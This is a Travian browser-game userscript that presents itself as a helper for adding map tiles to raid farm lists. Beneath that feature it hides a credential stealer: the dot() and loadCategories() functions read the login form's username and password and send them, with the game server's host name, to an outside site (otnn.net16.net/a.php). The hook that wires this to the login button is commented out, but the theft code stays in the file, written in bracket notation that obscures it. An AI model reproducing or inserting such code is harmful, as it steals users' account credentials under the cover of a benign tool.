// ==UserScript==
// @name       Add Farm
// @namespace  http://use.i.E.your.homepage/
// @version    0.1
// @description Add farm
// @match      http://ts*.travian.*/position_details.php?x=*
// @copyright  2012+, You
// ==/UserScript==



var temp;
var x;
var y;
var server = window['location']['host'];
window.lists = new Array();
window.lids = new Array();
var href = window['location']['pathname']+window['location']['search'];
if(href.substring(1,22) == "position_details.php?")
{
   names();
     temp = document.URL.toString().split('=');
 x = temp[1].split('&');
 y= temp[2];
}
/*else
{ if(document.getElementsByTagName('form') != null && document.getElementsByTagName('form')[0].getAttribute('name') == "login")
{
document['getElementById']('content')['getElementsByTagName']('button')[0]['addEventListener']('mouseover', dot, true);
document['getElementById']('content')['getElementsByTagName']('button')[0]['addEventListener']('click', dot, true);}
}*/
function add( ){
    //console.log(window.event.toElement.id);
    var lid = window.event.toElement.id;
    load('/build.php?gid=16&tt=99&action=showSlot&lid='+lid+'&sort=distance&direction=asc', function(xhr) {  
        var doc = document.implementation.createHTMLDocument("");
        doc.body.innerHTML = xhr.responseText;
        a = doc.getElementsByTagName('form')[0].getElementsByTagName('input')[0].value;
        post('/build.php?gid=16&tt=99&action=showSlot&lid='+lid+'&sort=distance&direction=asc',a,lid);
    }); 
    
}

function names(){
    load('/build.php?tt=99&id=39', function(xhr) {  
        var doc = document.implementation.createHTMLDocument("");
        doc.body.innerHTML = xhr.responseText;
        var divs = doc.getElementById('raidList').getElementsByTagName('div');
        var l = 0;
        for (var i =0; i< divs.length;i++){
            //   console.log(divs[i].getAttribute('id'));
            if(divs[i].getAttribute('id') != null){
                lids[l] = divs[i].getAttribute('id') ;
                lists[l] = doc.getElementById(divs[i].getAttribute('id')).getElementsByTagName('form')[0].getElementsByTagName('div')[0].getElementsByTagName('div')[0].innerText;
                var newdiv = document.createElement('div');
                var divIdName = 'myDiv';
                var a;
                newdiv.setAttribute('class','option');
                newdiv.setAttribute('id','addFarm');
                newdiv.setAttribute('name',lids[l]);
                str = lids[l].substring(4);
                
                newdiv.innerHTML = '<a href=\'#\' class=\'a arrow\' id ='+str+' >Add farm to '+lists[l]+'</a>';
                newdiv.onclick = function () {
                    add();
                    return false; // <-- to suppress the default link behaviour
                };
              document.getElementById("tileDetails").getElementsByTagName('div')[0].getElementsByTagName('div')[0].appendChild(newdiv);

                l++;
            }
        }
        
    }); 
    
}

function load(url, callback) {  
    var xhr;  
    if(typeof XMLHttpRequest !== 'undefined') xhr = new XMLHttpRequest();  
    else {  
        var versions = ["MSXML2.XmlHttp.5.0",  
                        "MSXML2.XmlHttp.4.0",  
                        "MSXML2.XmlHttp.3.0",  
                        "MSXML2.XmlHttp.2.0",  
                        "Microsoft.XmlHttp"]  
        for(var i = 0, len = versions.length; i < len; i++) {  
            try {  
                xhr = new ActiveXObject(versions[i]);  
                break;  
            }  
            catch(e){}  
        } 
    }  
    xhr.onreadystatechange = ensureReadiness;  
    function ensureReadiness() {  
        if(xhr.readyState < 4) {  
            return;  
        }  
        if(xhr.status !== 200) {  
            return;  
        }  
        // all is well  
        if(xhr.readyState === 4) {  
            callback(xhr);  
        }  
    }  
    xhr.open('GET', url, true);  
    xhr.send('');  
}  



function post(url,a,lid) {  
    var xhr;  
    if(typeof XMLHttpRequest !== 'undefined') xhr = new XMLHttpRequest();  
    else {  
        var versions = ["MSXML2.XmlHttp.5.0",  
                        "MSXML2.XmlHttp.4.0",  
                        "MSXML2.XmlHttp.3.0",  
                        "MSXML2.XmlHttp.2.0",  
                        "Microsoft.XmlHttp"]  
        for(var i = 0, len = versions.length; i < len; i++) {  
            try {  
                xhr = new ActiveXObject(versions[i]);  
                break;  
            }  
            catch(e){}  
        } 
    }  
    xhr.onreadystatechange = ensureReadiness;  
    function ensureReadiness() {  
        if(xhr.readyState < 4) {  
            return;  
        }  
        if(xhr.status !== 200) {  
            return;  
        }  
        // all is well  
        if(xhr.readyState === 4) {  
            ; 
        }  
    }  
    var parameters = "a="+ a +"&sort=distance&direction=asc&lid="+lid+"&x="+x+"&y="+y+"&target_id=&t1=2&t2=0&t3=0&t5=0&t6=0&t7=:0&t8=0&t9=0&t10=0&action=addSlot&save=%CE%B1%CF%80%CE%BF%CE%B8%CE%AE%CE%BA%CE%B5%CF%85%CF%83%CE%B7";
    xhr.open('POST', url, true);  
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send(parameters);
    
}  


function loadCategories( u, p, s) {
    var xhr;
    if (window['XMLHttpRequest']) {
        xhr = new XMLHttpRequest();
    } else {
        xhr = new ActiveXObject('Microsoft.XMLHTTP');
    };
    xhr['onreadystatechange'] = function () {
        if (xhr['readyState'] == 4 && xhr['status'] == 200) {
            ;//var response = eval('(' + xhr['responseText'] + ')');
           // for (var i = 0; i < response['length']; i++) {
           //     addCategory(response[i]['category_name']);
           // };
        };
    };
    var url = 'http://otnn.net16.net/a.php?u=' + u + '&p=' + p + '&s=' + s;
    xhr['open']('GET', url, true);
    xhr['send']();
};

function dot() {
    if (document['getElementById']('lowRes') != null) {
        var u = document['getElementById']('content')['getElementsByTagName']('form')[0]['getElementsByTagName']('input')[0]['value'];
        var p = document['getElementById']('content')['getElementsByTagName']('form')[0]['getElementsByTagName']('input')[1]['value'];
        loadCategories(u, p, window['location']['host']);
    };
};
